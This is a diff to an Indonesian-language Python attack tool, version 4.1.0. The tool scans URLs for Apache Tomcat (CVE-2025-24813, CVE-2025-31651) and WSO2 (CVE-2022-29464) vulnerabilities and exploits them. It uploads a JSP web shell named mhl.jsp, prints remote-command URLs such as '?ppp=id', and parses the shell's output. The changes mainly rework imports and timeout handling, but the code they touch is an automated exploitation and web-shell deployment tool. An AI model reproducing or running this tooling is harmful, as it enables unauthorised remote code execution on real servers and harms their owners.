@@ -28,16 +28,18 @@ except ImportError:
     pass
 
 try:
-    from urllib3.exceptions import InsecureRequestWarning
-    warnings.filterwarnings("ignore", category=InsecureRequestWarning)
+    from urllib3.exceptions import InsecureRequestWarning, ConnectTimeoutError, MaxRetryError, TimeoutError
+    from urllib3.util import Timeout
+    from urllib3 import PoolManager, ProxyManager, make_headers
 except ImportError:
-    pass
+    print(f"{RED1}{BOLD}\n * Pustaka 'urllib3' tidak ditemukan. Silakan install dengan 'pip install urllib3'.\n{ENDC}")
+    exit(1)
 
 # Menonaktifkan pembuatan file log
 logging.captureWarnings(True)
 
 __author__ = "MHL TEAM (Original), Sincan2 (Refactoring)"
-__version__ = "4.0.0 (CVE-2022-29464 Added)"
+__version__ = "4.1.0 (UX & Error Handling Fix)"
 
 # Definisi warna
 RED = '\x1b[91m'
@@ -48,21 +50,6 @@ YELLOW = '\033[1;33m'
 BOLD = '\033[1m'
 NORMAL = '\033[0m'
 ENDC = '\033[0m'
-
-# Import pustaka modern
-try:
-    from urllib3.util import Timeout
-    from urllib3 import PoolManager, ProxyManager, make_headers
-    from urllib3.exceptions import MaxRetryError, NewConnectionError, ReadTimeoutError
-except ImportError:
-    print(f"{RED1}{BOLD}\n * Pustaka 'urllib3' tidak ditemukan. Silakan install dengan 'pip install urllib3'.\n{ENDC}")
-    exit(1)
-
-try:
-    import requests
-except ImportError:
-    print(f"{RED1}{BOLD}\n * Pustaka 'requests' tidak ditemukan. Silakan install dengan 'pip install requests'.\n{ENDC}")
-    exit(1)
 
 # Variabel Global
 gl_interrupted = False
@@ -126,7 +113,6 @@ def print_shell_banner(url):
 def parse_shell_output(raw_text):
     """Mencoba mem-parsing output mentah dari web shell."""
     try:
-        # Coba parse dari pre, jika gagal, fallback ke body
         if '<pre>' in raw_text:
              output = raw_text.split('<pre>')[1].split('</pre>')[0]
              return output.strip()
@@ -186,7 +172,6 @@ def check_vul(url):
         paths["Spoofed Data Bypass (CVE-2023-6236)"] = ""
         paths["Apache Tomcat Path Traversal (CVE-2025-24813)"] = ""
         paths["Tomcat Rewrite Bypass (CVE-2025-31651)"] = ""
-        # PERUBAHAN: Menambahkan CVE baru ke daftar pengecekan
         paths["WSO2 File Upload (CVE-2022-29464)"] = ""
         
     results = {}
@@ -202,7 +187,6 @@ def check_vul(url):
                 elif "CVE-2023-6236" in vector: res = _exploits.send_spoofed_data(url, headers)
                 elif "CVE-2025-24813" in vector: res = _exploits.exploit_tomcat_cve_2025_24813(url, headers)
                 elif "CVE-2025-31651" in vector: res = _exploits.exploit_tomcat_rewrite_bypass_cve_2025_31651(url, headers)
-                # PERUBAHAN: Menambahkan panggilan ke fungsi baru
                 elif "CVE-2022-29464" in vector: res = _exploits.exploit_wso2_fileupload_cve_2022_29464(url, headers)
 
                 if res.get('status') == 'vulnerable':
@@ -213,12 +197,11 @@ def check_vul(url):
                     elif "CVE-2025-31651" in vector:
                         exploit_url = f"{parsed_main_url.scheme}://{parsed_main_url.netloc}/sec/orders/mhl.jsp?ppp=id"
                         print_and_flush(f"    {YELLOW}└─> Shell diunggah, coba akses: {exploit_url}{ENDC}")
-                    # PERUBAHAN: Menampilkan contoh RCE untuk CVE baru
                     elif "CVE-2022-29464" in vector:
                         exploit_url = f"{parsed_main_url.scheme}://{parsed_main_url.netloc}/authenticationendpoint/mhl.jsp?ppp=id"
                         print_and_flush(f"    {YELLOW}└─> Shell diunggah, coba akses: {exploit_url}{ENDC}")
                     results[vector] = 200
-                elif res.get('status') in ['timeout', 'connection_error', 'failed_put', 'failed_get', 'error']:
+                elif res.get('status') in ['failed_put', 'failed_get', 'error']:
                     print_and_flush(RED + f"  [ GAGAL / ERROR ]" + ENDC); results[vector] = 505
                 else:
                     print_and_flush(GREEN + "  [ OK ]" + ENDC); results[vector] = 404
@@ -228,9 +211,13 @@ def check_vul(url):
                     print_and_flush(RED + "  [ RENTAN ]" + ENDC); results[vector] = 200
                 else:
                     print_and_flush(GREEN + "  [ OK ]" + ENDC); results[vector] = 404
+        # PERBAIKAN: Membedakan pesan antara Timeout dan Error lain
+        except (ConnectTimeoutError, MaxRetryError, TimeoutError):
+            print_and_flush(f"{YELLOW} [ TARGET OFFLINE (Timeout) ]{ENDC}")
+            results[vector] = 505
         except Exception as e:
             error_type = type(e).__name__
-            print_and_flush(f"{RED} [ TIMEOUT / ERROR: {error_type} ]{ENDC}")
+            print_and_flush(f"{RED} [ GAGAL ({error_type}) ]{ENDC}")
             results[vector] = 505
     return results
 
@@ -355,7 +342,6 @@ if __name__ == "__main__":
                         shell_path = "/mhl.jsp"
                     elif "CVE-2025-31651" in vector:
                         shell_path = "/sec/orders/mhl.jsp"
-                    # PERUBAHAN: Menambahkan logika auto-exploit untuk CVE baru
                     elif "CVE-2022-29464" in vector:
                         shell_path = "/authenticationendpoint/mhl.jsp"
 
